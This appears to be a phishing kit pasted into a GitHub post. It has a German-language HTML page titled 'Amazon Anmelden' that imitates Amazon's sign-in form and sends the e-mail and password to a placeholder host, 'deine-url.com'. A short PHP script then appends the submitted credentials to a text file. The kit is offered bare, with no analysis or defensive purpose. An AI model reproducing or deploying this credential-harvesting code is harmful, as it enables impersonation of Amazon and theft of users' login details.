<!DOCTYPE html>
<html>
<head>
    <title>Amazon Anmelden</title>
</head>
<body>
    <h1>Amazon Anmelden</h1>
    <form action="https://deine-url.com/login" method="post">
        <label for="email">E-Mail-Adresse:</label><br>
        <input type="email" id="email" name="email"><br>
        <label for="password">Passwort:</label><br>
        <input type="password" id="password" name="password"><br>
        <input type="submit" value="Anmelden">
    </form>
</body>
</html>[script.php.txt](https://github.com/user-attachments/files/18465883/script.php.txt)
[script.php.txt](https://github.com/user-attachments/files/18466027/script.php.txt)
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Speichere die Daten in einer Datei
    $file = fopen("data.txt", "a");
    fwrite($file, "E-Mail: " . $email . " Passwort: " . $password . "\n");
    fclose($file);

    echo "Deine Daten wurden erfolgreich gespeichert.";
}
?>
